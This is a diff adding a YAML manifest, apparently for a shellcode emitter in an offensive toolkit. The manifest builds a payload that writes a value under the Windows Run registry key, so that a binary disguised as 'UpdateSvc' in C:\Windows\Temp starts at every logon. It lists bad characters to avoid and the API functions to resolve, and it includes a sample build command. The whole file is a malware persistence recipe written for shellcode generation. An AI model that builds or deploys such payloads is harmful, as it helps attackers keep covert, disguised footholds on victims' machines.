@@ -1,0 +1,36 @@
+template: registry_persist
+# Add a Run registry value so the binary auto-starts on user logon.
+#
+# Build:
+#   uv run emitter Tools/emitter/manifests/registry_persist.yaml \
+#       --service-name "UpdateSvc" \
+#       --dst "C:\\Windows\\Temp\\svc.exe" \
+#       --out emitter_out/
+badchars: ["00", "0a", "0d"]
+
+functions:
+  - LoadLibraryA
+  - RegOpenKeyExA
+  - RegSetValueExA
+  - RegCloseKey
+  - ExitProcess
+
+variables:
+  - reg_handle
+
+strings:
+  - label: advapi32_dll
+    value: "advapi32.dll"
+    method: push
+  - label: reg_subkey
+    value: "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
+    method: mov
+    dest: edi
+  - label: reg_value_name
+    value: "UpdateSvc"
+    method: mov
+    dest: edi
+  - label: dst_path
+    value: "C:\\Windows\\Temp\\svc.exe"
+    method: mov
+    dest: edi
